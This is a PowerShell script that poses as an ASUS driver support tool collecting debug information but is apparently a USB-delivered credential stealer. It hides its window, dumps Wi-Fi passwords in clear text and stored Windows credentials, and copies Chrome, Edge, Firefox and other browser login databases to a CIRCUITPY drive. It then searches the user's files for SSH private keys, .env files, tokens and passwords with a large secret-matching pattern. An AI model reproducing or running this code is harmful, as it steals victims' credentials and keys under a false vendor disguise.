Write-Output "ASUS Driver & Firmware Support - Collecting Debug Information"
$timer = [System.Diagnostics.Stopwatch]::StartNew()
Start-Job -ScriptBlock { Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; using System.Threading; public class W { [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow(); public static void D(int d) { Thread.Sleep(d); ShowWindow(GetForegroundWindow(), 6); } }'; [W]::D(5000); }
Write-Output ("_-" * 50)
Write-Output "Systeminfo"
Write-Output ("-" * 100)
systeminfo
Write-Output "Tasklist"
Write-Output ("-" * 100)
tasklist
Write-Output "netstat"
Write-Output ("-" * 100)
netstat -ano | Select-String "TCP|UDP" | ForEach-Object { $columns = $_ -split '\s+'; $processId = $columns[-1]; $proc = Get-Process -Id $processId -ErrorAction SilentlyContinue; "$($_) $(if ($proc) { $proc.Name } else { 'Unknown' })" }
Write-Output "Userinfo"
Write-Output ("-" * 100)
whoami /all
net user
Write-Output "net localgroup"
Write-Output ("-" * 100)
net localgroup
Write-Output "Get-NetAdapter"
Write-Output ("-" * 100)
Get-NetAdapter
Write-Output "ipconfig /all"
Write-Output ("-" * 100)
ipconfig /all
Write-Output "ipconfig /displaydns"
Write-Output ("-" * 100)
ipconfig /displaydns
Write-Output "route print"
Write-Output ("-" * 100)
route print
Write-Output "ARP-Table"
Write-Output ("-" * 100)
arp -a
Write-Output "net share"
Write-Output ("-" * 100)
net share
Write-Output "Installed Software"
Write-Output ("-" * 100)
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall" /s
Write-Output "Autorun"
Write-Output ("-" * 100)
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /s
Write-Output "Get-PSDrive -PSProvider FileSystem"
Write-Output ("-" * 100)
Get-PSDrive -PSProvider FileSystem
Write-Output "Get-ChildItem Env:"
Write-Output ("-" * 100)
Get-ChildItem Env:
Write-Output "User Dir"
Write-Output ("-" * 100)
Get-ChildItem
Write-Output ("-" * 100)
# Finished Basic Info, trying to go deeper now...
Write-Output "Get-ScheduledTask"
Write-Output ("-" * 100)
Get-ScheduledTask
Write-Output "Wifi Infos"
Write-Output ("-" * 100)
try { $wlansvcStatus = Get-Service -Name WlanSvc -ErrorAction SilentlyContinue; if ($wlansvcStatus.Status -eq 'Running') { $profiles = netsh wlan show profiles | Select-String ":(.*)" | ForEach-Object { ($_ -split ":")[1].Trim() }; if ($profiles.Count -eq 0) { Write-Output "[-] No Wi-Fi profiles found"; }; $profiles | ForEach-Object { netsh wlan show profile name="$_" key=clear } } } catch { Write-Output "[-] Error Wi-Fi: $_" }
Write-Output "Looking for Certificate Authorities..."
Write-Output ("-" * 100)
cmdkey /list;
$deloid = ((Get-Volume | Where-Object { $_.FileSystemLabel -eq "CIRCUITPY" }).DriveLetter + ":") -replace "^:$", "F:"
$db1 = @( "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data", "$env:USERPROFILE\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data", "$env:USERPROFILE\AppData\Local\Microsoft\Edge\User Data\Default\Login Data", "$env:USERPROFILE\AppData\Roaming\Opera Software\Opera Stable\Login Data", "$env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\logins.json", "$env:USERPROFILE\AppData\Local\Microsoft\Windows\INet Login", "$env:USERPROFILE\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data" )
foreach ($dbP in $db1) { try { $dbPaths = Get-ChildItem -Path "$dbP" -ErrorAction SilentlyContinue } catch { Write-Output "[-dbP-]" } foreach ($dbPath in $dbPaths) { try { $path = $dbPath.FullName; if (((Get-Acl "$path").Access.IdentityReference -match "$env:USERDOMAIN\\$env:USERNAME") -or ((Get-Acl "$path").Owner -match "$env:USERDOMAIN\\$env:USERNAME")) { $content = Get-Content -Path $dbPath.FullName -ErrorAction Stop -Raw; if ($content -match "username|password") {  Write-Output "[+] Browser Creds: $($dbPath.FullName)"; Compress-Archive -Path $($dbPath.FullName) -DestinationPath "$deloid/sd/$(Split-Path -Leaf $dbPath.FullName)_$(Get-Random).zip"; } } } catch { Write-Output "[-bcc-]" } } };
$dTs = @("$env:USERPROFILE", "$env:PATH"); $xcldFoD = 'cache|game|izotop|node_modules|example|assetto|cyberpunk|simulator|bower_components|lib|site-packages|dist-packages|vendor|packages|nuget|elasticsearch|maven|gradle|lib|pycache|venv|localization|jdk|native|steamapps|resources|thunderbird|outlook|jquery|miniconda|pkgs|micropython|circuitpython|addon|extension|powershell_tran|docs|cinebench|breach|eclipse|framework|views'; $sigFlN = "otr.private_key", "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "id_rsa.pub", "id_dsa.pub", "id_ecdsa.pub", "id_ed25519.pub", "id_rsa_old", "id_rsa_backup", "id_ecdsa_old", "id_ed25519_backup", "id_rsa_temp", "id_dsa_temp", "ssh_key", "ssh_key.pub", "secret_token.rb", "carrierwave.rb", "database.yml", "omniauth.rb", "settings.py", "jenkins.plugins.publish_over_ssh.BapSshPublisherPlugin.xml", "credentials.xml", "LocalSettings.php", "Favorites.plist", "configuration.user.xpl", "journal.txt", "knife.rb", "proftpdpasswd", "robomongo.json", "*.rsa", "*.dsa", "*.ed25519", "*.ecdsa", "*.history", "*.mysql_history", "*.psql_history", "*.pgpass", "*.irb_history", "*.dbeaver-data-sources.xml", "*.muttrc", "*.s3cfg", "sftp-config.json", "*.trc", "config*.php", "*.htpasswd", "*.tugboat", "*.git-credentials", "*.gitconfig", "*.env", "heroku.json", "dump.sql", "id_rsa_pub", ".remote-sync.json", ".esmtprc", "deployment-config.json", ".ftpconfig"; $sigExt ="*.php", "*.txt", "*.docx", "*.ini", "*.md", "*.rtf", "*.csv", "*.xml", "*.one", "*.dcn", "*.env", "*.mailmap", "*.config", "*.yaml", "*.yml", "*.json", "*.properties", "*.plist", "*.password", "*.key", "*.pem", "*.log", "*.pkcs12", "*.p12", "*.pfx", "*.asc", "*.ovpn", "*.id_rsa", "*.id_dsa", "*.id_ecdsa", "*.id_ed25519", "*.id_rsa.pub", "*.id_dsa.pub", "*.id_ecdsa.pub", "*.id_ed25519.pub", "*.id_rsa_old", "*.id_rsa_backup", "*.id_ecdsa_old", "*.id_ed25519_backup", "*.id_rsa_temp", "*.id_dsa_temp", "*.ssh_key", "*.ssh_key.pub", "*.cscfg", "*.rdp", "*.mdf", "*.sdf", "*.sqlite", "*.sqlite3", "*.bek", "*.tpm", "*.fve", "*.jks", "*.psafe3", "*.agilekeychain", "*.keychain", "*.pcap", "*.gnucash", "*.kwallet", "*.tblk", "*.dayone", "*.keypair", "*.keystore", "*.keyring", "*.sql", "*.ppk", "*.sqldump"; $exclEt = @('*.exe', '*.jpg', '*.jpeg', '*.png', '*.gif', '*.bmp', '*.tiff', '*.tif', '*.zip', '*.gz', '*.lock', '*.py', '*.js', '*.ps1', '*.ini'); $rgPath = "c:\windows\temp\rg.exe"
$combinedPattern = @'
(?ms)(?:-----BEGIN (RSA|DSA|EC|PGP|OPENSSH|PRIVATE|PUBLIC|ENCRYPTED) KEY BLOCK-----[\s\S]*?-----END \1 KEY BLOCK-----|-----BEGIN PGP PUBLIC KEY BLOCK-----[\s\S]*?-----END PGP PUBLIC KEY BLOCK-----|-----BEGIN (RSA|DSA|EC|PGP|OPENSSH|PRIVATE|PUBLIC|ENCRYPTED) PRIVATE KEY-----[\s\S]*?-----END \1 KEY-----|-----BEGIN.*KEY-----[\s\S]*?-----END.*KEY-----|[A-Za-z0-9+/=]{40,}|[A-Za-z0-9+/=]{40,}|\b[0-9a-fA-F]{32,128}\b|(?:https?|ftp)://\S+(?:key|token|id)=\S+|export\s+\w+=([\"\']?)[A-Za-z0-9+/=]{20,}\1|[\'\"]?[A-Za-z0-9]{10,}[\'\"]?\s*[.\+\|\s]+\s*[\'\"]?[A-Za-z0-9]{10,}[\'\"]?(?:\/\/|#|\/\*|\*\/).*(?:key|token|password|pwd)[\s:=]+\S+[A-Za-z0-9_-]{20,}\|[A-Za-z0-9_-]{20,}[\"\']?(?:access_token|api_key|auth|secret|password|session_id|client_id|client_secret)[\"\']?\s*:\s*[\"\'][A-Za-z0-9+/=]{20,}[\"\']<(?:input|meta)[^>]+(?:value|content)=[\"\']?[A-Za-z0-9+/=]{20,}[\"\']?(?:HEAD|origin/.*|refs/.*):.*(?:key|token|password|secret)[^\x00-\x1F\x7F-\x9F]{3,20}[:=][^\x00-\x1F\x7F-\x9F]{3,50}\b(?:20[0-9]{2}|19[0-9]{2})-(?:0[1-9]|1[0-2])-(?:0[1-9]|[12][0-9]|3[01])\beyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}\s*[:=]\s*\S+INSERT\s+INTO\s+\w+\s+VALUES\s+\([^)]*(?:password|pwd)[^)]*[\'\"]?\S+[\'\"]?)
'@
$excludeDirs = "--glob=!$($xcldFoD -replace '\|', ' --glob=!*/')"; $globIncludes = @($sigFlN).ForEach({ $_ -replace '\*', '' }) + ($sigExt | ForEach-Object { if ($_ -match '.*\*.*') { "--glob=$_" } else { "--glob=$($_)" } }) -join ' '; $globExcludes = ($exclEt | ForEach-Object { "--glob=!$_" }) -join " "; $globExcludes += " " + $excludeDirs; $fileList = @(); $unDup = @{};
foreach ($dir in $dTs) { $resolvedDir = (Resolve-Path -Path "$dir" -ErrorAction SilentlyContinue).Path; if (-not $resolvedDir -or $resolvedDir -match $xcldFoD) { continue };  $cmdArgs = "--files " + $globIncludes + " " + $globExcludes + " " + $resolvedDir; $fileList += & $rgPath @($cmdArgs.Split(' ')) 2>$null; }; $fileList | Where-Object { -not ($_ -imatch $xcldFoD) } | ForEach-Object { $unDup[$_] = $null }; try { $cores = (Get-CimInstance Win32_Processor).NumberOfCores * 2 } catch { $cores = 8 };
foreach ($file in $unDup.Keys) { if (-not (Test-Path $file -PathType Leaf)) { continue }; if ((Get-Item $file).Length / 1KB -gt 100) { continue }; & $rgPath -uu -U -j "$cores" --max-columns 512000 --regex-size-limit 1000000 --max-filesize=1M --max-depth 1 --pcre2 -- $combinedPattern $file 2>$null; }
Write-Output "Finished collecting ASUS Debug Info, uploading..."
$timer.Stop(); $timer.Elapsed
